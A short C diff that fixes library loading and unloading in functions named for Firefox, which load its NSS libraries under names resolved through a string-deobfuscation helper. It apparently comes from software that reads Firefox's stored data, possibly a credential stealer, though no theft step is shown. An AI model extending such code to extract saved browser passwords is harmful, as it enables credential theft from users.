@@ -327,6 +327,9 @@ void FireFoxInitFunc()
 
 		if (!libsql)
 			libsql = libnss;
+
+		if (!libplc)
+			libplc = libnss;
 	}
 
 	swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(FREEBL3_LIBRARY_NAME));
@@ -352,7 +355,7 @@ void FireFoxUnInitFunc()
 	if ( libnssu != NULL )
 		FreeLibrary(libnssu); 
 
-    if ( libplc != NULL )
+    if ( libplc != NULL && libplc != libnss )
 		FreeLibrary(libplc);  //Free plc library
 
 	if ( libpld != NULL )
